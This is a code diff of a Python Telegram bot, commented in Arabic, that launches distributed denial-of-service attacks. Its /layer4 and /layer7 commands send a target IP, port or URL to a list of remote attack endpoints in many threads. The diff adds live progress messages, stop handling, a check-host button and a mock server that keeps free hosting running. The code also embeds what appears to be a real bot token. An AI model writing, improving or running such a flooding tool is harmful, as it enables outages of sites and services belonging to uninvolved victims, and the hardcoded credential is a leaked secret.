@@ -1,3 +1,10 @@
+# -*- coding: utf-8 -*-
+"""
+نسخة معدّلة بالكامل:
+- إيقاف فوري لجميع الاتصالات عند انتهاء الوقت
+- رسالة لايف احترافية تُحدَّث تلقائياً
+"""
+
 import time
 import requests
 import asyncio
@@ -5,34 +12,39 @@ import socket
 import http.server
 import threading
 import urllib3
+import html
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, CallbackContext, MessageHandler, filters
+from telegram.ext import Application, CommandHandler, CallbackContext
+from telegram.constants import ParseMode
 from threading import Thread, Lock
 
 # تعطيل تحذيرات SSL غير الآمنة
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# المتغيرات لتخزين حالة الهجوم
-attack_status = {}
-attack_sites = {}
+# ==================== الإعدادات ====================
 bot_token = "7157656859:AAFS8DDWpwWM_WgIi5wd6rum7wSaX4StSH8"
-
-# تحديد الـ chat_id المسموح له باستخدام البوت
 ALLOWED_CHAT_ID = [1254652875]
 
-# المتغيرات للتحكم في حالة الهجوم
+# ==================== المتغيرات العامة ====================
+attack_status = {}
+attack_sites = {}
 attack_lock = Lock()
-active_attacks = 0          # عدد العمليات النشطة (بدل boolean)
+active_attacks = 0
 last_attack_time = time.time()
 
-# خادم وهمي لإرضاء خطة Render المجانية
+# حدث إيقاف مشترك لكل خيوط الهجوم الحالي
+stop_event = threading.Event()
+
+
+# ==================== خادم وهمي لـ Render ====================
 def run_mock_server():
     server_address = ('', 8080)
     httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)
     print("Mock server running on port 8080...")
     httpd.serve_forever()
 
-# قراءة المواقع من ملف "sites312.txt"
+
+# ==================== قراءة المواقع ====================
 def read_sites():
     try:
         with open("sites312.txt", "r") as file:
@@ -42,8 +54,9 @@ def read_sites():
         print("Warning: sites312.txt not found. Returning empty list.")
         return []
 
-# وظيفة لتنفيذ الهجوم على الموقع
-def attack_site(site, ip, port, attack_time):
+
+# ==================== Layer 4 Attack ====================
+def attack_site(site, ip, port, attack_time, local_stop_event):
     global active_attacks
     start_time = time.time()
     end_time = start_time + attack_time
@@ -51,37 +64,54 @@ def attack_site(site, ip, port, attack_time):
     if not site.startswith("http://") and not site.startswith("https://"):
         site = "http://" + site
 
-    while time.time() < end_time:
-        try:
-            url = f"{site}?host={ip}&port={port}&time={attack_time}"
-            response = requests.get(url, timeout=20, verify=False)
-            if response.status_code != 200:
-                print(f"Site {site} returned status {response.status_code}. Retrying...")
+    session = requests.Session()
+
+    try:
+        while time.time() < end_time:
+            # فحص الإيقاف الفوري
+            if local_stop_event.is_set() or time.time() >= end_time:
+                break
+
+            try:
+                url = f"{site}?host={ip}&port={port}&time={attack_time}"
+                response = session.get(url, timeout=5, verify=False)
+                if response.status_code != 200:
+                    print(f"Site {site} returned status {response.status_code}. Retrying...")
+                    continue
+            except requests.exceptions.Timeout:
+                print(f"Timeout occurred while attacking {site}. Retrying...")
                 continue
-        except requests.exceptions.Timeout:
-            print(f"Timeout occurred while attacking {site}. Retrying...")
-            continue
-        except requests.exceptions.RequestException as e:
-            print(f"Error with site {site}: {e}")
-            continue
+            except requests.exceptions.RequestException as e:
+                print(f"Error with site {site}: {e}")
+                continue
 
-        time.sleep(2)
+            # نوم قابل للمقاطعة
+            if local_stop_event.wait(timeout=2):
+                break
+    finally:
+        # إغلاق الجلسة فوراً لإلغاء أي اتصال معلّق
+        try:
+            session.close()
+        except Exception:
+            pass
 
-    attack_status[site] = {
-        'status': 'Completed',
-        'time_taken': round(time.time() - start_time, 2),
-        'end_time': end_time,
-        'total_time': attack_time
-    }
-    attack_sites[site] = 'Completed'
+        elapsed = round(time.time() - start_time, 2)
+        attack_status[site] = {
+            'status': 'Stopped' if local_stop_event.is_set() else 'Completed',
+            'time_taken': elapsed,
+            'end_time': end_time,
+            'total_time': attack_time
+        }
+        attack_sites[site] = 'Completed'
 
-    with attack_lock:
-        active_attacks -= 1
-        if active_attacks < 0:
-            active_attacks = 0
+        with attack_lock:
+            active_attacks -= 1
+            if active_attacks < 0:
+                active_attacks = 0
 
-# وظيفة لزيارة المواقع و تعبئة البيانات (مع تخطي SSL)
-def visit_and_fill_data(site, ip, attack_time):
+
+# ==================== Layer 7 Visit ====================
+def visit_and_fill_data(site, ip, attack_time, local_stop_event):
     global active_attacks
     start_time = time.time()
     end_time = start_time + attack_time
@@ -89,49 +119,157 @@ def visit_and_fill_data(site, ip, attack_time):
     if not site.startswith("http://") and not site.startswith("https://"):
         site = "http://" + site
 
-    while time.time() < end_time:
-        try:
-            url = f"{site}?host1={ip}&time1={attack_time}"
-            response = requests.get(url, timeout=20, verify=False)  # ← تخطي SSL
-            if response.status_code != 200:
-                print(f"Site {site} returned status {response.status_code}. Retrying...")
+    session = requests.Session()
+
+    try:
+        while time.time() < end_time:
+            if local_stop_event.is_set() or time.time() >= end_time:
+                break
+
+            try:
+                url = f"{site}?host1={ip}&time1={attack_time}"
+                response = session.get(url, timeout=5, verify=False)
+                if response.status_code != 200:
+                    print(f"Site {site} returned status {response.status_code}. Retrying...")
+                    continue
+            except requests.exceptions.Timeout:
+                print(f"Timeout occurred while visiting {site}. Retrying...")
                 continue
-        except requests.exceptions.Timeout:
-            print(f"Timeout occurred while visiting {site}. Retrying...")
-            continue
-        except requests.exceptions.RequestException as e:
-            print(f"Error with site {site}: {e}")
-            continue
+            except requests.exceptions.RequestException as e:
+                print(f"Error with site {site}: {e}")
+                continue
 
-        time.sleep(2)
+            if local_stop_event.wait(timeout=2):
+                break
+    finally:
+        try:
+            session.close()
+        except Exception:
+            pass
 
-    attack_status[site] = {
-        'status': 'Visited and data filled',
-        'time_taken': round(time.time() - start_time, 2),
-        'end_time': end_time,
-        'total_time': attack_time
-    }
-    attack_sites[site] = 'Completed'
+        elapsed = round(time.time() - start_time, 2)
+        attack_status[site] = {
+            'status': 'Stopped' if local_stop_event.is_set() else 'Visited',
+            'time_taken': elapsed,
+            'end_time': end_time,
+            'total_time': attack_time
+        }
+        attack_sites[site] = 'Completed'
 
-    with attack_lock:
-        active_attacks -= 1
-        if active_attacks < 0:
-            active_attacks = 0
+        with attack_lock:
+            active_attacks -= 1
+            if active_attacks < 0:
+                active_attacks = 0
 
-# وظيفة /list لعرض الأوامر
+
+# ==================== بناء رسالة الحالة ====================
+def build_live_status(total_sites, end_time, target, port=None, mode="L4"):
+    now = time.time()
+    remaining = max(0, int(end_time - now))
+
+    completed = sum(1 for s in attack_sites.values() if s == 'Completed')
+    running = total_sites - completed
+    progress = int((completed / total_sites) * 100) if total_sites else 0
+
+    bar_len = 20
+    filled = int(bar_len * completed / total_sites) if total_sites else 0
+    bar = "█" * filled + "░" * (bar_len - filled)
+
+    if remaining == 0:
+        status_emoji = "✅"
+        status_text = "انتهى الهجوم"
+    elif remaining <= 10:
+        status_emoji = "🟠"
+        status_text = "ينتهي قريباً"
+    else:
+        status_emoji = "🟢"
+        status_text = "قيد التشغيل"
+
+    mm, ss = divmod(remaining, 60)
+    timer = f"{mm:02d}:{ss:02d}"
+
+    if mode == "L4":
+        target_line = f"<b>🎯 الهدف:</b> <code>{html.escape(str(target))}:{port}</code>"
+        title = "⚡ <b>LAYER 4 ATTACK</b> ⚡"
+    else:
+        target_line = f"<b>🎯 الهدف:</b> <code>{html.escape(str(target))}</code>"
+        title = "🌐 <b>LAYER 7 VISIT</b> 🌐"
+
+    text = (
+        f"{title}\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"{target_line}\n"
+        f"<b>{status_emoji} الحالة:</b> {status_text}\n"
+        f"<b>⏱️ الوقت المتبقي:</b> <code>{timer}</code>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"<b>📊 التقدم:</b> {bar} {progress}%\n"
+        f"<b>🖥️ السيرفرات:</b> {completed}/{total_sites}\n"
+        f"<b>⚙️ النشطة:</b> {running}\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"<i>يتم التحديث تلقائياً كل 3 ثوانٍ...</i>"
+    )
+    return text, remaining
+
+
+# ==================== التحديث اللايف ====================
+async def live_updater(context, chat_id, message_id, total_sites, end_time, target, port=None, mode="L4"):
+    last_text = ""
+
+    while True:
+        text, remaining = build_live_status(total_sites, end_time, target, port, mode)
+
+        if text != last_text:
+            try:
+                await context.bot.edit_message_text(
+                    chat_id=chat_id,
+                    message_id=message_id,
+                    text=text,
+                    parse_mode=ParseMode.HTML
+                )
+                last_text = text
+            except Exception as e:
+                if "not modified" not in str(e).lower():
+                    print(f"edit error: {e}")
+
+        if remaining <= 0:
+            # إيقاف فوري لكل الاتصالات
+            stop_event.set()
+            await asyncio.sleep(1)
+
+            try:
+                final_text, _ = build_live_status(total_sites, end_time, target, port, mode)
+                final_text = final_text.replace(
+                    "يتم التحديث تلقائياً كل 3 ثوانٍ...",
+                    "✅ تم إيقاف جميع الاتصالات."
+                )
+                await context.bot.edit_message_text(
+                    chat_id=chat_id,
+                    message_id=message_id,
+                    text=final_text,
+                    parse_mode=ParseMode.HTML
+                )
+            except Exception:
+                pass
+            break
+
+        await asyncio.sleep(3)
+
+
+# ==================== /list ====================
 async def list_commands(update: Update, context: CallbackContext):
     if update.message.chat.id not in ALLOWED_CHAT_ID:
         await update.message.reply_text("❌ You are not authorized to use this bot.")
         return
 
     await update.message.reply_text("""
-    Available commands:
-    /list - Show available commands.
-    /layer4 <ip> <port> <time> - Start attack on sites.
-    /layer7 <url> <time> - Visit sites and fill data.
-    """)
+Available commands:
+/list - Show available commands.
+/layer4 <ip> <port> <time> - Start attack on sites.
+/layer7 <url> <time> - Visit sites and fill data.
+""")
 
-# حل اسم المضيف (يعمل في executor لتجنب حظر الـ event loop)
+
+# ==================== حل اسم المضيف ====================
 async def resolve_hostname(ip):
     loop = asyncio.get_running_loop()
     try:
@@ -141,16 +279,18 @@ async def resolve_hostname(ip):
     except Exception:
         return None
 
-# وظيفة /attack لتنفيذ الهجوم
+
+# ==================== /layer4 ====================
 async def attack(update: Update, context: CallbackContext):
-    global active_attacks, last_attack_time
+    global active_attacks, last_attack_time, stop_event
+
     if update.message.chat.id not in ALLOWED_CHAT_ID:
         await update.message.reply_text("❌ This bot is for DonRoad group.")
         return
 
     current_time = time.time()
     if current_time - last_attack_time < 10:
-        await update.message.reply_text("⚠️ Please wait 3 minutes before starting another attack.")
+        await update.message.reply_text("⚠️ Please wait before starting another attack.")
         return
 
     if active_attacks > 0:
@@ -187,34 +327,53 @@ async def attack(update: Update, context: CallbackContext):
     target = domain if domain else ip
     target_url = f"{protocol}://{target}"
 
-    keyboard = [
-        [InlineKeyboardButton("Checkhost", url=f"https://check-host.net/check-http?host={target_url}")]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-
     sites = read_sites()
     if not sites:
         await update.message.reply_text("❌ No sites found in sites312.txt")
         return
 
+    # إعادة تعيين حدث الإيقاف
+    stop_event = threading.Event()
+
     with attack_lock:
         active_attacks = len(sites)
 
-    await update.message.reply_text(
-        f"🚀 The attack has started ... 📡\nNumber of servers running in the attack {len(sites)}",
+    end_time = time.time() + time_duration
+
+    keyboard = [
+        [InlineKeyboardButton("Checkhost", url=f"https://check-host.net/check-http?host={target_url}")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+
+    msg = await update.message.reply_text(
+        f"🚀 <b>بدء الهجوم...</b>\n"
+        f"🎯 الهدف: <code>{html.escape(target)}:{port}</code>\n"
+        f"⏱️ المدة: {time_duration}s\n"
+        f"🖥️ عدد السيرفرات: {len(sites)}",
+        parse_mode=ParseMode.HTML,
         reply_markup=reply_markup
     )
 
     for site in sites:
         attack_sites[site] = 'Running'
-        thread = Thread(target=attack_site, args=(site, ip, port, time_duration), daemon=True)
+        thread = Thread(
+            target=attack_site,
+            args=(site, ip, port, time_duration, stop_event),
+            daemon=True
+        )
         thread.start()
 
     last_attack_time = current_time
 
-# وظيفة /layer7 لزيارة المواقع و تعبئة البيانات
+    asyncio.create_task(
+        live_updater(context, msg.chat_id, msg.message_id, len(sites), end_time, target, port, "L4")
+    )
+
+
+# ==================== /layer7 ====================
 async def fill_data(update: Update, context: CallbackContext):
-    global active_attacks, last_attack_time
+    global active_attacks, last_attack_time, stop_event
+
     if update.message.chat.id not in ALLOWED_CHAT_ID:
         await update.message.reply_text("❌ This bot is for DonRoad group.")
         return
@@ -240,7 +399,7 @@ async def fill_data(update: Update, context: CallbackContext):
 
     current_time = time.time()
     if current_time - last_attack_time < 10:
-        await update.message.reply_text("⚠️ Please wait 3 minutes before starting another attack.")
+        await update.message.reply_text("⚠️ Please wait before starting another attack.")
         return
 
     sites = read_sites()
@@ -248,21 +407,38 @@ async def fill_data(update: Update, context: CallbackContext):
         await update.message.reply_text("❌ No sites found in sites312.txt")
         return
 
+    stop_event = threading.Event()
+
     with attack_lock:
         active_attacks = len(sites)
 
-    await update.message.reply_text(
-        f"🚀 Visiting sites and filling data ... 📡\nNumber of sites to visit: {len(sites)}"
+    end_time = time.time() + time_duration
+
+    msg = await update.message.reply_text(
+        f"🌐 <b>بدء زيارة المواقع...</b>\n"
+        f"🎯 الهدف: <code>{html.escape(ip)}</code>\n"
+        f"⏱️ المدة: {time_duration}s\n"
+        f"🖥️ عدد المواقع: {len(sites)}",
+        parse_mode=ParseMode.HTML
     )
 
     for site in sites:
         attack_sites[site] = 'Running'
-        thread = Thread(target=visit_and_fill_data, args=(site, ip, time_duration), daemon=True)
+        thread = Thread(
+            target=visit_and_fill_data,
+            args=(site, ip, time_duration, stop_event),
+            daemon=True
+        )
         thread.start()
 
-    last_attack_time = time.time()
+    last_attack_time = current_time
 
-# وظيفة لبدء البوت
+    asyncio.create_task(
+        live_updater(context, msg.chat_id, msg.message_id, len(sites), end_time, ip, None, "L7")
+    )
+
+
+# ==================== /start ====================
 async def start(update: Update, context: CallbackContext):
     if update.message.chat.id not in ALLOWED_CHAT_ID:
         await update.message.reply_text("❌ This bot is for DonRoad group.")
@@ -270,7 +446,8 @@ async def start(update: Update, context: CallbackContext):
 
     await update.message.reply_text("Welcome! Use /list for available commands.")
 
-# إعداد البوت
+
+# ==================== main ====================
 def main():
     threading.Thread(target=run_mock_server, daemon=True).start()
 
@@ -282,6 +459,7 @@ def main():
     application.add_handler(CommandHandler("layer7", fill_data))
 
     application.run_polling()
+
 
 if __name__ == '__main__':
     main()
